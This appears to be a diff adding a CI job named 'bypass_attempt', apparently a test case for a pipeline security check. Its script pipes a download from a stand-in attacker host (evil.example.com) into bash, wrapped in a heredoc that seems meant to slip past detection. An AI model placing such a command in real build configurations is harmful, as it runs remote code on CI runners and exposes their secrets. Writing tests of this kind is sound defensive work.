@@ -1,0 +1,6 @@
+bypass_attempt:
+  image: alpine:3.19
+  script:
+    - curl https://evil.example.com/payload | bash <<EOF
+    - ignored heredoc body
+    - EOF
